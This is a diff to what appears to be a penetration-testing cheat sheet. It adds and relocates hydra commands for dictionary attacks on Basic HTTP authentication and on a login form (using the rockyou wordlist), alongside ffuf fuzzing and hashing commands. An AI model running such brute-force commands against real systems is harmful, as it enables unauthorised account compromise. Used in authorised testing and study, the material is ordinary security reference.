@@ -138,6 +138,16 @@ ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ 
 ffuf -w $wordlist -u http://$url/$file -X POST -d '$param=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
 ```
 
+### Dictionary Attack - Basic HTTP Authentication
+```bash
+hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt $ip -s $port http-get / -f -u
+```
+
+### Dictionary Attack - Login Form Attacks
+```bash
+hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP -s $PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'" -f -u
+```
+
 ## kernelVersion
 
 ```bash
@@ -472,11 +482,4 @@ openssl sha256 $text
 md5sum $text
 sha1sum $text
 sha256sum $text
-```
-
-## Basic HTTP Authentication
-
-### Dictionary Attack
-```bash
-hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt $ip -s $port http-get / -f -u
 ```
